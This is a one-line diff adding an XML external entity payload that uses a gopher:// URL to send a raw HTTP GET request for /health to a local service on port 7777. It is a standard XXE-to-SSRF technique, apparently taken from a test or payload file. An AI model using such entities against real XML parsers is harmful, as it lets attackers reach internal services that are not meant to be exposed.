@@ -1,0 +1,1 @@
+<!ENTITY xxe SYSTEM "gopher://127.0.0.1:7777/_GET%20/health%20HTTP/1.1%0D%0AHost:%20127.0.0.1:7777%0D%0AConnection:%20close%0D%0A%0D%0A">
